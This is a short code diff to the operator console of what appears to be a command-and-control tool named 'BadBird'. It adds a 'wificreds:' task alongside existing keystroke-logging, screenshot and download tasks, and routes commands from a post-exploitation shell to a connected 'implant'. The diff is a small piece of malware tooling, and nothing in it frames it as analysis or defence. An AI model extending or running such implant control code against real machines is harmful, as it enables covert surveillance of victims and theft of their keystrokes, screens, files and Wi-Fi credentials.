@@ -106,7 +106,7 @@ def taskCommand(cmd):
     if pwd == True:
         cmd = "pwdtask:" + cmd
 
-    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith("download:"):
+    if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith("download:") or cmd.startswith("wificreds:"):
         cmd = cmd
 
     else:
@@ -787,7 +787,11 @@ def main():
             elif cmd.lower() == "post-exp":
                 if connected == True:
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Entering BadBird post-exploitation shell...\n")
-                    postExpShell()
+                    cmd = postExpShell()
+                    if cmd != "":
+                        taskCommand(cmd)
+                        lastdictsize = getResults(lastdictsize)
+
                 else:
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
